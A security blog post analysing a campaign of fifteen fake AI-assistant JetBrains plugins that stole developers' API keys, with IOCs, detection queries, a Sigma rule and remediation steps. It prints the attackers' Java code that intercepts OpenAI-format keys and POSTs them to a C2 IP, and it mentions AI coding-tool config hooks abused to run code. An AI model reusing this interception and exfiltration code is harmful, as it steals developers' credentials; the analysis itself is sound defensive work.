---
layout: post
title: "JetBrains Marketplace Backdoored: 15 AI-Themed Plugins Harvested Developer API Keys for Eight Months — C2 Still Live"
date: 2026-06-24
categories: [supply-chain, security]
tags: [jetbrains, ide-plugins, supply-chain, api-key-theft, credential-harvesting, deepseek]
author: Prakhar Gupta
description: "Eight months, 70,000 installs, and a live C2 in Beijing: how 15 fake AI coding assistants on the JetBrains Marketplace silently stole OpenAI and DeepSeek API keys — and what defenders need to do right now."
toc: true
---

> **TL;DR for analysts and <span class="glossary-term" data-bs-toggle="tooltip" title="Incident Response. The structured set of activities an organization undertakes to identify, contain, eradicate, and recover from a security incident.">IR</span> teams.** Fifteen third-party plugins masquerading as DeepSeek- and AI-powered coding assistants were published on the JetBrains Marketplace between October 2025 and June 2026. Each plugin functioned as advertised while intercepting every AI provider API key entered into its settings pane and silently POSTing it over unencrypted HTTP to a hardcoded command-and-control server at `39.107.60.51` (Alibaba Cloud, Beijing). JetBrains removed the plugins and banned seven publisher accounts on 17 June 2026, but StepSecurity confirmed on 19 June that the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> remains live and actively responding. **If any affected plugin was installed in your fleet before that date, every API key entered into it must be treated as compromised and rotated immediately.** The primary <span class="glossary-term" data-bs-toggle="tooltip" title="Indicator of Compromise, an artifact observed on a network or in an operating system that, with high confidence, indicates a computer intrusion.">IOC</span> for network detection is outbound HTTP from JetBrains IDE processes to `39.107.60.51` carrying the header `X-Api-Key: F48D2AA7CF341F782C1D`.

---

## Watch the 6-Minute Walkthrough

<!-- VIDEO_EMBED:START -->
<!--
  The Security Blog Automator pipeline replaces this block with the rendered
  <iframe> after NotebookLM Cinematic Video Overview generation completes.
  Source script: _video/script-jetbrains-marketplace-ai-plugin-supply-chain.md
-->
<div class="video-embed-placeholder" style="position:relative;padding-top:56.25%;background:#0b1220;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#cfd8e3;font-family:system-ui,sans-serif;">
  <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;padding:1rem;">
    <strong>Video rendering in progress.</strong><br/>
    A narrated walkthrough of this article will appear here once the publishing pipeline completes the NotebookLM video step.
  </div>
</div>
<!-- VIDEO_EMBED:END -->

---

## 1. Context: Why This Matters

JetBrains IDEs — IntelliJ IDEA, PyCharm, GoLand, WebStorm, and their cousins — run on an estimated 30 million developer machines worldwide. The JetBrains Marketplace lists over 9,000 third-party plugins, and developers install them with the same casual trust they once applied to browser extensions: if it's on the official store, it has presumably been vetted.

That trust assumption is exactly what TeamPCP (the threat group responsible for the broader <span class="glossary-term" data-bs-toggle="tooltip" title="The June 2026 npm supply-chain campaign that compromised 32 @redhat-cloud-services packages via the RedHatInsights GitHub Actions OIDC trusted publisher. Self-propagating worm; payload runs under Bun.">Miasma</span> worm campaign) appears to have stress-tested for eight months. The JetBrains campaign is not a single <span class="glossary-term" data-bs-toggle="tooltip" title="A computer-software vulnerability that is unknown to, or unaddressed by, those who should be interested in mitigating the vulnerability.">zero-day</span> or a rushed smash-and-grab. It is a patient, iterative operation: start with small-download plugins to test the exfiltration pipeline without triggering anomaly detection, expand gradually, then flood the zone with high-download packages right before the campaign's detection threshold is crossed. The final two plugins, published June 9–10 2026, accumulated over 53,000 downloads in under a week — dwarfing the cumulative count of all 13 earlier plugins combined.

The timing is not coincidental. This week also saw the <span class="glossary-term" data-bs-toggle="tooltip" title="The June 2026 npm supply-chain campaign that compromised 32 @redhat-cloud-services packages via the RedHatInsights GitHub Actions OIDC trusted publisher. Self-propagating worm; payload runs under Bun.">Miasma</span> worm plant AI coding tool hooks (`.claude/settings.json`, `.gemini/settings.json`, `.cursor/rules/`) inside 73 disabled Microsoft Azure repositories to harvest developer credentials on folder open. The convergence of two parallel campaigns targeting developer workstations through IDE-adjacent vectors in the same week signals a maturing attack playbook: **the developer environment is the new perimeter**.

For SecOps and <span class="glossary-term" data-bs-toggle="tooltip" title="Incident Response. The structured set of activities an organization undertakes to identify, contain, eradicate, and recover from a security incident.">IR</span> teams, the operational implication is specific: audit every JetBrains IDE in your fleet for the 15 plugin IDs listed in Section 5, rotate any AI provider API keys that were entered into those plugins, and block the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> IP at both the perimeter and endpoint layer before pivoting to forensics.

---

## 2. Technical Mechanism: From Plugin Install to Exfiltrated Key

### 2.1 The JetBrains Plugin Trust Model

JetBrains plugins are packaged as ZIP archives containing JAR files (compiled Java) and a `plugin.xml` descriptor. JetBrains code-signs the plugin distribution infrastructure, but it does not statically analyse the JAR bytecode of third-party submissions beyond a basic malware scan. A plugin that passes automated review can include arbitrary Java — including networking code that calls out to any IP address on any port.

The 15 malicious plugins were fully functional. They called DeepSeek, OpenAI, and SiliconFlow APIs legitimately and surfaced real AI outputs in the IDE. The credential-stealing code was surgically grafted onto the settings persistence layer, so the malicious behaviour was only reachable through normal UI interaction, not through automated testing of plugin APIs.

### 2.2 Credential Interception: The `save()` Hook

When a developer opened the plugin's settings panel, entered an API key, and clicked **Apply**, the standard IntelliJ platform called the plugin's `save()` method. The attacker overrode this method to intercept the key before it reached the IDE's secure credential store:

```java
public static void save(String key) {
    if (key != null && key.startsWith("sk-") && seen.add(key)
        && StringUtils.length(key) == 51) {
        SoftwareDto dto = new SoftwareDto();
        dto.setApiKey(key);
        BaseUtil.request("key", dto); // silently exfiltrates to C2
    }
}
```

Three design choices are worth calling out. First, the `startsWith("sk-")` and `length == 51` checks target the OpenAI API key format precisely, filtering out test strings and reducing noise on the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> side. Second, `seen.add(key)` uses a `Set` to deduplicate: the key is only exfiltrated once per IDE session, reducing network volume and detection probability. Third, the call to `BaseUtil.request()` is a single line with no error handling — if the network call fails, the key is still stored locally. The plugin never breaks for the victim.

### 2.3 TLS Warning Suppression

Before the POST request fires, the plugin installs a JVM-wide `X509TrustManager` that accepts all certificates without validation. This suppresses the "insecure connection" warnings that some IDE builds and local security proxies would otherwise surface, and neutralises any TLS inspection proxy that enforces strict certificate checking on the JVM trust store.

### 2.4 Plaintext Exfiltration: `BaseUtil.request()`

The stolen key is serialised as a Gson JSON payload and sent over unencrypted HTTP to the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span>:

```java
URL url = new URI("http://39.107.60.51/api/software/" + name).toURL();
HttpURLConnection connection = (HttpURLConnection) url.openConnection();
connection.setRequestMethod("POST");
connection.setRequestProperty("Content-Type", "application/json");
connection.setRequestProperty("X-Api-Key", "F48D2AA7CF341F782C1D");

byte[] input = new Gson()
    .toJson(payload)
    .getBytes(StandardCharsets.UTF_8);
connection.setDoOutput(true);
connection.getOutputStream().write(input, 0, input.length);
```

Using plain HTTP rather than HTTPS is a common attacker trade-off: it avoids certificate management complexity and sidesteps TLS inspection on the outbound side, while simultaneously being trivially detectable on any network that inspects HTTP traffic. Defenders who enforce HTTPS-only egress on developer workstations would have seen the anomalous HTTP outbound and had an immediate detection signal.

### 2.5 The Donation Wall: A Self-Sustaining Fraud Loop

The <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> server exposed a secondary endpoint — `/api/software/check` — that implemented what the attacker called a "donation wall." When a victim paid a fee through an in-plugin payment prompt, the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> returned a working API key (sourced from another victim's stolen credentials) to unlock premium features. The original key owner unknowingly paid the AI provider bill for usage they never authorised. This fraud loop made the operation financially self-sustaining independent of any secondary sale market for stolen credentials.

### 2.6 Attack Topology

![Diagram](https://kroki.io/mermaid/svg/eNqNks9u00AQxu88xci9NCL_qzZqD0hO3EJaolokAiSbw2Y9TpZsdle7a7eReuHCFV6hLwBInDjxMpS-BhM7SC0nfFhZo2-_3zczu7DMLGEWPQH6wiSIsESpDdpU7Z-jH1omlINxdNoI3kGr9ewmGCvnmZQOjCwWQqUqt3oNE2ZX6I1kHIMbGCbBhEnBhS4cxJUOzsNX5Nk73N1zTRhAiSrTFhjnulDeEaPKMfxL8mg5Gu8gjMewwk2qtAKH3gu1oKIxckO0URI4VuJ-A5Zar1JFQigJnzEvSP8UMswKs_Me1d4vZrMY4svpLFUUWhDp2pPybSs0onVBBktkGVpyj5Jg1Icp2nI7lIPjdq87aB9124e9VIVSzNmcwUjqImvCEMV7SrYjRTVp6rVFB85riapugqbBsjWdhPa5tmvCnCbBr5-3vz98vf9ye__5492P73efvtHAxmorqDuZLNaexlnfaaRK0RyvO712v9vuUfipsUSHodb-cYRIq9rgDS0uVR1mRMfp3F8xix2-RL6iAGdJELPN1uC14F6sU2WRoyj_yV5tmyntl2ihrJSPt_YSF4KKzGO1Nb59K9RHXki5gbxQfJuEyQYhnydBOIbY6lLQrLdyUl4aVFTtQIRopogr-p0KekxanUl9RbCK5vxGIjWYCylP9nj34Lg_b3IttT3Zy_P8geb0PzSjnQaPBtjvP9T8AQ3sDB4=)

### 2.7 Attack Sequence

![Diagram](https://kroki.io/mermaid/svg/eNptUl1v2kAQfOdXrPJkJDAfCSWxlEguLipEFBQozUNermYxJ8537t3ZBFX9792zQYGAH-6s08zu7Mwa_JOjjDHiLNEsrQF9GdOWxzxj0kKEBTDjLhQqQw2j6NsFaCbyhEuHO_x54_ClfgEbLycO466Fzo2dMMkS1Be4QdfB6PRuH_xOu-9_afu9zmW9cORwdM60KviKxIWzUa2Ekd7m01OlJoCRNJYJAWutUhij_aoZlwYmTG_RZoLFWJJ-KIugCqpD9MaRfBgpY8aggfSDAxoLjrsr_aYZSpijtVwmpgEobaUNtrhvQCx4vIUwy8S-5FasE7phBXr1AAom-IqRJrNtQqZxzd8bIFAmdvP42Ouck8nVj0EpqJQbwwuE11774dRtymY5ae7Irvp5gUE3gO-LxQxm0_kCWizjLaPWdsc0tkj3m_xLT8-4D-CG9Pi-f_PvTb42w4w3y9fh3X3UDcP-YHh71xn277uDTlR2GHSbJ8OVLbrtNkyfP5nuBFAlMFZpXIFbqFXqnBfMrpVOr5s1d2hnLAgV0-x78GhFYZ3L2HJFKUuiuvf6laB-GnT7s0Zmc6rixWp1jLUBFo2FBCUFaGP_k1vhKCgTdS1hx-3GyaZsSiWewIRbnrrsckOuV-RwdGoE9dVoMpKIp6UJQRoDiLihwfcHWC4seAWnkVLIJXOh1K_srLNwWaEM0rYqSX5UBpCN5R7_xg0ruMr1MZsq-Rc0SJM49QVnECnJnH3wy813vgzxBuNt7T-jIFmv)

---

## 3. Why Standard Defences Did Not Catch This

| Defence Layer | Expected Behaviour | Why It Failed Here |
|---|---|---|
| **JetBrains Marketplace review** | Blocks malicious plugins | Automated review tested functionality, not credential intercept in `save()`. All 15 plugins were fully functional AI tools. |
| **Antivirus / <span class="glossary-term" data-bs-toggle="tooltip" title="Endpoint Detection and Response. A class of security tooling that records process, file, network, and identity events on endpoints for hunting, alerting, and response.">EDR</span> signature scanning** | Flags malicious payloads | JAR bytecode was not obfuscated in a traditional sense; the credential theft is a ~20-line method inside a 10,000-line functional plugin. No CVE, no known-malicious hash. |
| **TLS inspection proxy** | Intercepts and inspects outbound TLS traffic | Plugin used plain HTTP, bypassing TLS inspection entirely. Most enterprise egress policies focus on HTTPS; HTTP egress from developer tools is frequently allowed for package registries. |
| **JVM security manager / sandbox** | Restricts network access from JVM processes | JetBrains IDEs ship with the security manager disabled or relaxed for plugin compatibility. Plugin JAR runs with full JVM privileges by design. |
| **Developer credential stores** | Protects secrets stored by the IDE | The key was intercepted *before* it reached the credential store, at the `save()` call site. |
| **<span class="glossary-term" data-bs-toggle="tooltip" title="Software Composition Analysis. Tooling that inventories third-party packages in a codebase and matches them against vulnerability and compromise feeds.">SCA</span> / dependency scanning** | Detects known-malicious packages | This is an IDE plugin, not a package dependency. Most <span class="glossary-term" data-bs-toggle="tooltip" title="Software Composition Analysis. Tooling that inventories third-party packages in a codebase and matches them against vulnerability and compromise feeds.">SCA</span> tools do not inventory IDE extensions. |
| **Network monitoring for exfiltration** | Detects large or anomalous outbound data flows** | The exfiltrated payload is a single JSON field (≤55 bytes). No volume anomaly. Without IP reputation or HTTP plaintext inspection, this traffic is invisible. |

The structural gap is that **no defence layer owned IDE plugins as a supply-chain asset**. Package SBOMs track npm/PyPI/Maven dependencies. IDE extensions live in a grey zone: they are software running on developer machines with full system access, installed through a separate channel that most security tooling ignores.

---

## 4. Detection

### 4.1 Endpoint Detection: Microsoft Defender XDR

Hunt for outbound network connections from JetBrains IDE processes to the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> IP. This query covers both Windows and macOS process names:

```kql
DeviceNetworkEvents
| where Timestamp > ago(90d) // extend window — 8-month campaign
| where RemoteIP == "39.107.60.51"
    or (RemotePort == 80 and RemoteUrl has "/api/software/")
| where InitiatingProcessFileName in~ (
    "java.exe", "java",
    "idea64.exe", "idea",
    "pycharm64.exe", "pycharm",
    "goland64.exe", "goland",
    "webstorm64.exe", "webstorm",
    "rider64.exe", "rider",
    "clion64.exe", "clion"
)
| project
    Timestamp,
    DeviceName,
    DeviceId,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    RemoteIP,
    RemoteUrl,
    RemotePort,
    RemoteIPType
| order by Timestamp desc
```

**Expected positives:** Any row in this result set indicates an IDE process contacted the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span>. A device with results should be triaged immediately.

### 4.2 Broad API Key Exfiltration Hunt

Extend the hunt to any HTTP (port 80) POST from IDE processes to non-RFC-1918 IP addresses — this catches variants that rotate <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> IPs while keeping the same transport mechanism:

```kql
DeviceNetworkEvents
| where Timestamp > ago(90d)
| where RemotePort == 80
    and ActionType == "ConnectionSuccess"
| where InitiatingProcessFileName in~ (
    "java.exe", "java", "idea64.exe", "idea",
    "pycharm64.exe", "pycharm", "goland64.exe", "goland",
    "webstorm64.exe", "webstorm"
)
| where RemoteIPType != "Private"
    and RemoteIP !startswith "127."
| summarize
    ConnectionCount = count(),
    DistinctRemoteIPs = dcount(RemoteIP),
    RemoteIPs = make_set(RemoteIP, 20)
    by DeviceName, InitiatingProcessFileName
| where ConnectionCount > 0
| order by ConnectionCount desc
```

### 4.3 Plugin Directory Audit (PowerShell Fleet Script)

For Windows fleet inventory, this PowerShell snippet can be run via Intune/SCCM or exported as a Defender Live Response script to identify affected machines:

```powershell
$MaliciousPluginIDs = @(
    "org.sm.yms.toolkit", "com.json.simple.kit", "org.bug.find.tools",
    "org.translate.ai.simple", "com.yy.test.ai.simple", "com.dev.ai.toolkit",
    "com.json.view.simple", "com.my.git.ai.kit", "org.check.ai.ds",
    "com.review.tool.code", "org.code.assist.dev.tool", "com.coder.ai.dpt",
    "com.my.code.tools", "ord.cp.code.ai.kit", "com.dp.git.ai.tool"
)

$JetBrainsPluginRoots = @(
    "$env:APPDATA\JetBrains",
    "$env:LOCALAPPDATA\JetBrains"
)

foreach ($root in $JetBrainsPluginRoots) {
    if (Test-Path $root) {
        Get-ChildItem -Path $root -Recurse -Directory |
        Where-Object { $MaliciousPluginIDs -contains $_.Name } |
        Select-Object FullName, LastWriteTime |
        ForEach-Object {
            Write-Output "COMPROMISED PLUGIN FOUND: $($_.FullName) (last modified: $($_.LastWriteTime))"
        }
    }
}
```

### 4.4 Sigma Rule (Cross-SIEM)

```yaml
title: JetBrains IDE Plaintext HTTP Exfiltration to Known Malicious C2
id: b7f4e310-3a91-4c8a-bde2-5c7a8f0d1e23
status: stable
description: |
  Detects outbound HTTP connections from JetBrains IDE processes to 39.107.60.51,
  associated with the June 2026 AI plugin supply chain attack campaign.
references:
  - https://www.stepsecurity.io/blog/jetbrains-malicious-plugins-ai-api-key-theft
author: Prakhar Gupta
date: 2026/06/24
tags:
  - attack.exfiltration
  - attack.t1567
  - attack.credential_access
  - attack.t1552.001
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    dst_ip: '39.107.60.51'
    Initiated: 'true'
  ide_process:
    Image|endswith:
      - '\java.exe'
      - '\idea64.exe'
      - '\pycharm64.exe'
      - '\goland64.exe'
      - '\webstorm64.exe'
      - '\rider64.exe'
  condition: selection and ide_process
falsepositives:
  - None expected; IP is confirmed C2 infrastructure
level: high
```

---

## 5. Mitigation

### 5.1 Immediate: Revoke All Exposed API Keys

If any of the 15 plugin IDs are or were present in an IDE on your network, treat every API key entered into those plugins as fully compromised. Rotation is non-negotiable — the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> is still live as of June 19, meaning stolen keys may still be in active use or for sale.

**OpenAI:** Platform dashboard → API Keys → Revoke → Generate new. Set a spending cap on the new key while investigating.

**DeepSeek:** DeepSeek developer console → API Keys → Revoke all keys predating June 17, 2026.

**SiliconFlow:** SiliconFlow account settings → Token management → Rotate all tokens.

### 5.2 Block the C2 IP (Firewall + EDR)

At the perimeter firewall, drop all outbound and inbound traffic to `39.107.60.51`:

```powershell
# Windows Firewall (run as Administrator or deploy via GPO)
New-NetFirewallRule `
    -DisplayName "Block JetBrains Plugin C2 - 39.107.60.51" `
    -Direction Outbound `
    -RemoteAddress "39.107.60.51" `
    -Action Block `
    -Profile Any `
    -Enabled True
```

For cloud-managed endpoints using Microsoft Defender for Endpoint, add the IP to the Custom Indicators block list:
`Security.microsoft.com → Settings → Endpoints → Indicators → IP Addresses → Add → 39.107.60.51 → Block and Remediate`

### 5.3 Enforce HTTPS-Only Egress from Developer Workstations

This campaign used plain HTTP precisely because most enterprise policies focus on HTTPS inspection and leave port-80 egress from developer tools unrestricted. Block outbound port 80 from IDE processes at the host firewall level, with a whitelist for known legitimate registries (e.g., repo1.maven.org, plugins.jetbrains.com). This makes future variants that use plaintext exfiltration immediately detectable.

### 5.4 Implement IDE Plugin Allowlisting via MDM / Intune

JetBrains IDE's `idea.properties` and plugin management settings can be centralised via Intune configuration profiles. For managed fleets, consider a plugin allowlist policy that requires security-team approval before any plugin not on the approved list can be installed:

```xml
<!-- idea.properties snippet — deploy via Intune Win32 app or Config Profile -->
<!-- Disable plugin auto-updates from marketplace to force manual review -->
idea.updates.url=https://internal-plugin-mirror.corp/updates.xml
idea.plugins.url=https://internal-plugin-mirror.corp/plugins/
```

Pairing this with a proxy that only serves approved, hash-verified plugin ZIPs removes the attacker's distribution channel entirely.

### 5.5 Add AI Provider API Keys to Secrets Scanning

Extend your secrets scanning pipeline (gitleaks, trufflehog, detect-secrets) with rules that flag OpenAI-format keys (`sk-[A-Za-z0-9]{48}`) in any committed files, CI/CD environment variables, and shell history artifacts on developer machines. While stolen keys may already be on the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span>, catching accidental commits can limit secondary exposure:

```yaml
# .gitleaks.toml addition
[[rules]]
  id = "openai-api-key"
  description = "OpenAI API Key"
  regex = '''sk-[A-Za-z0-9]{48}'''
  tags = ["api-key", "openai"]
```

---

## 6. IR Playbook

The following timeline assumes an alert fires on the <span class="glossary-term" data-bs-toggle="tooltip" title="Kusto Query Language. The query language used by Microsoft Sentinel, Azure Log Analytics, and Defender for hunting and detection across telemetry.">KQL</span> query from Section 4.1 detecting a connection from a developer workstation to `39.107.60.51`.

![Diagram](https://kroki.io/mermaid/svg/eNqNVV9vIjcQf79PMeJeWjUkQAIEKrXiIKh7zeUocIqq41QZ7yxr4fWsbC8c7fW7d7xekvTaSuVpZY9nfv9sMk1HmQvrYT17Bfxbdz621t91xjDRyKuZsug2ZoYHJfEB_ZHs_u6AxjvIlQcycD267HaGl4POZb-7MZmlApLZHZSWJDoXKsIZ54VX_P3YbX2CdvsHWHfjuG4Y1-1DocwY1laJHW7MlAwPLqDU1U4Z7oUOjUQ4KLExCzqiXeWoNWQa0YOTVpU1lkdGkKSMTmWn8-FkBsKkoAxD4CNeFchfRXnG0Ys4en-0FucDG8O9CqGVVFQ50Mr5H1t_NnXh1Jdf0X2B9fXLpQfild_mi4-tudAOoSSnvDrwh_A5K0iyKhjZBUhNvC2CvK1PscN1EOG6E0VYSSpZg2VlGn6iSllqIS2xnoFDIQzLlEJau-JecA67IstQet4uhMyVCfuLitf_zcOMbH2GvXT_NBM_ezSpMjsYdSAVJwdbIfdn4W4i9pvaQMjtGNg2L5RhPI608Mh-QB0IE4duzBtNcv-3KSA8lGjZFY8W5o8bM0lTxprxZF6YVs6HRDEMKTzZ8_B-HN4Pw3txuMVaBaFhSTFtG_NAUZazJKwYy7HEA-2xJv6-RDNJrmaI5Qpxf7VS7DqZOV8L2OOJi7kncmtwKiSwCdU5TSmzDP0c2-S5p3HfQ1WGVZgmV9MZOJQWvTvDHkTYgwD7poY9J8unlORJU1H6yj7NeDtZRvW-NnRj7j57K6Svg52ipKJUGhkAyObiOHHAb76FnGhf01V4hK3SOniZCpdvSdg02l8ZUfmcrPqdJ0wSqFy8gjmyU6EgOGlZ1YIOGBIcbiGwKxpNLRGLETJdpU1QNe2e-A4j32Hge1vzXTLcA9rTxnwwZxWfr1qk7mLw20eV1uq2lXMVcoqOMFkkcehR-Rxc2eRTijIISEVRmRCUWgw2GzSK9AnNbURzW4cmyr8g59uJkSpk5_mWQvJ-6i7qx4I1w4tnDyRVofBDNLmxiknQMTwTfOuZCpObB0MslsRvaA31Lfo3VgRu74Tdoy-14DhxPCqr_Ak8ioJ9LVi_ldoV4urnX-7BVtHVVXL37sxhFDmMAodhTP49v7PEje9RWIMpt2FZtwwnjy9xxGhjCpp3me9oUeropwoJN-xwU1koa8lyG8P2M8if1uvFqk1GnwB3NjzqX7_yyBK_qoE5f2LM6w7_cWg9fi0716Pe9kKSJjt-nWXZy6KbpggHQ-z1_qOo_3-KRk1Rbyhw0HlZ9Bfw_1FT)

**Key judgement calls for <span class="glossary-term" data-bs-toggle="tooltip" title="Incident Response. The structured set of activities an organization undertakes to identify, contain, eradicate, and recover from a security incident.">IR</span> leads:**
- The exposure window is the plugin install date to June 17, 2026 (removal). If the plugin was installed October 2025, rotate keys entered over 8 months — but in practice, most keys entered after June 9 are highest risk (53K installs, heaviest traffic to <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span>).
- Check AI provider billing dashboards first. Unexpected API spend is the fastest pivot indicator that a stolen key has already been monetised via the donation wall.
- The <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> being live means existing connections from an un-rotated key may still be occurring. Time-to-rotation is the primary metric here.

---

## 7. The Wider Picture: IDE Extensions as the Next Supply-Chain Frontier

This campaign arrives alongside two parallel developments that together define a strategic shift in attacker focus.

First, the <span class="glossary-term" data-bs-toggle="tooltip" title="The June 2026 npm supply-chain campaign that compromised 32 @redhat-cloud-services packages via the RedHatInsights GitHub Actions OIDC trusted publisher. Self-propagating worm; payload runs under Bun.">Miasma</span> worm demonstrated this same week that AI coding tool configuration hooks (`.claude/settings.json`, `.gemini/settings.json`) can execute arbitrary code the moment a developer opens an infected repository. The JetBrains campaign is the *plugin-layer* analogue: instead of poisoning the repository, poison the tool the developer uses to work in it. Both attacks target the same moment — developer machine, active coding session, full credential access.

Second, AI provider API keys have become high-value credentials in their own right. An OpenAI key with no spending cap represents a credit line that can be burned for inference queries, DALL-E generation, Whisper transcriptions, or fine-tuning runs. The attacker's donation wall demonstrates that these keys have a ready secondary market — effectively a credential-as-a-service layer that monetises theft faster than traditional account-takeover.

The implication for security teams is structural: **IDE extensions need to enter the software supply chain security model**. The same disciplines applied to npm/PyPI dependencies — SBOM, allowlisting, provenance verification, network egress monitoring — need to extend to IDE plugins, browser extensions, and VS Code extensions. JetBrains' remote kill-switch is a useful containment mechanism, but it presupposes JetBrains knows which plugins are malicious. The 8-month dwell time before discovery suggests this assumption requires pressure-testing.

Looking ahead, the next logical expansion surface is **model registries**. HuggingFace model cards with embedded `requirements.txt` that pull malicious packages, Ollama model files that execute on load, and custom Claude/Gemini tool registries are all candidate vectors for the same "trusted marketplace" attack pattern. Defenders building controls today should architect them to extend to these surfaces with minimal rework.

---

## Glossary

**API key:** A credential token (here, OpenAI format `sk-` + 48 characters) that authorises programmatic access to an AI provider's inference API. Compromise grants the attacker the ability to issue arbitrary model queries billed to the victim's account.

**<span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> (Command-and-Control):** The attacker-controlled server that receives exfiltrated data and issues instructions. Here, `39.107.60.51` on Alibaba Cloud in Beijing.

**Donation wall:** An in-plugin payment gate that returns a stolen API key (sourced from another victim) to the paying developer, creating a fraud loop where victims unknowingly subsidise each other's API usage.

**Dwell time:** The period between initial compromise or deployment and detection. The JetBrains campaign had an 8-month dwell time (Oct 2025 – Jun 2026).

**Gson:** Google's open-source Java library for serialising Java objects to JSON. Used here to package the stolen API key as a JSON payload before HTTP POST exfiltration.

**JVM TrustManager:** A Java interface controlling which TLS certificates the JVM considers valid. Installing a permissive (trust-all) `X509TrustManager` suppresses TLS validation warnings and neutralises SSL inspection proxies that rely on certificate chain enforcement.

**Marketplace supply-chain attack:** An attack that distributes malicious code through an official software distribution channel (here, the JetBrains Marketplace), exploiting user trust in the platform's implied vetting.

**Plugin allowlist:** An access-control policy that restricts which IDE extensions can be installed on managed workstations, typically enforced via MDM, configuration management, or an internal plugin mirror.

**Postinstall hook:** A script triggered automatically after a software package is installed (npm: `postinstall` in `package.json`; JetBrains: plugin `activate()` at IDE load). A common malware delivery mechanism in supply-chain attacks.

**Semver resolution:** The npm/package-manager algorithm that resolves a dependency range (e.g., `^1.11.21`) to the highest compatible version. Attackers exploit this by publishing a malicious minor/patch release that semver will automatically pull in.

**<span class="glossary-term" data-bs-toggle="tooltip" title="Supply-chain Levels for Software Artifacts. A security framework for software supply-chain integrity defined by the Open Source Security Foundation; provides build provenance attestation.">SLSA</span> (Supply-chain Levels for Software Artifacts):** A Google-led framework for software supply chain integrity assurance, providing levels of provenance and build-process verification for software artifacts.

**<span class="glossary-term" data-bs-toggle="tooltip" title="Software Composition Analysis. Tooling that inventories third-party packages in a codebase and matches them against vulnerability and compromise feeds.">SCA</span> (Software Composition Analysis):** Tooling that inventories open-source dependencies and checks them against known-vulnerability databases. Does not currently cover IDE plugins in most implementations.

**Typosquat:** A malicious package whose name closely resembles a popular legitimate package (e.g., `easy-day-js` vs. `dayjs`) to exploit installation typos or automated dependency resolution.

**X-Api-Key header:** A custom HTTP header used in the JetBrains attack to authenticate plugin requests to the <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> server. The hardcoded value `F48D2AA7CF341F782C1D` is a primary network <span class="glossary-term" data-bs-toggle="tooltip" title="Indicator of Compromise, an artifact observed on a network or in an operating system that, with high confidence, indicates a computer intrusion.">IOC</span>.

---

## Sources & Further Reading

### Primary Technical Analysis

- [15 Malicious JetBrains Plugins Stole AI API Keys from 70,000 Developers](https://www.stepsecurity.io/blog/jetbrains-malicious-plugins-ai-api-key-theft) — StepSecurity, June 18–19, 2026. Primary source: full <span class="glossary-term" data-bs-toggle="tooltip" title="Indicator of Compromise, an artifact observed on a network or in an operating system that, with high confidence, indicates a computer intrusion.">IOC</span> table, <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> analysis, code samples, vendor account list, and remediation guidance. <span class="glossary-term" data-bs-toggle="tooltip" title="Command and Control, a server that is used by an attacker to maintain communications with compromised systems within a target network.">C2</span> confirmed live June 19.
- [JetBrains Marketplace Ecosystem Security Update: Addressing Malicious Third-Party AI Plugins](https://blog.jetbrains.com/platform/2026/06/marketplace-ecosystem-security-update-malicious-ai-plugins/) — JetBrains Official Advisory, June 17, 2026. Confirms plugin removal, account bans, and remote kill-switch activation; states no JetBrains internal infrastructure was compromised.

### Secondary Coverage

- [Malicious JetBrains Marketplace plugins steal AI API keys from developers](https://www.bleepingcomputer.com/news/security/malicious-jetbrains-marketplace-plugins-steal-ai-api-keys-from-developers/) — BleepingComputer, June 2026. News coverage with victim perspective and additional timeline context.
- [Malicious JetBrains Plugins Steal AI API Keys as Chrome Extensions Capture Chatbot Chats](https://thehackernews.com/2026/06/malicious-jetbrains-plugins-steal-ai.html) — The Hacker News, June 2026. Broadens the IDE-to-browser-extension attack surface comparison; relevant for threat modeling.
- [Multiple JetBrains IDE plugins caught stealing AI keys](https://www.aikido.dev/blog/multiple-jetbrains-ide-plugins-caught-stealing-ai-keys) — Aikido Security, June 2026. Independent code analysis confirming the `save()` interception pattern.

### Campaign Context (Miasma / TeamPCP)

- [Miasma Worm Hits Microsoft Again: Azure Functions Action and 72 Other Repositories Disabled](https://www.stepsecurity.io/blog/miasma-worm-hits-microsoft-again-azure-functions-action-and-72-other-repositories-disabled-after-supply-chain-attack-targeting-ai-coding-agents) — StepSecurity, June 5, 2026. Documents the parallel AI coding-tool hook campaign that disabled 73 Microsoft Azure repositories the same week.
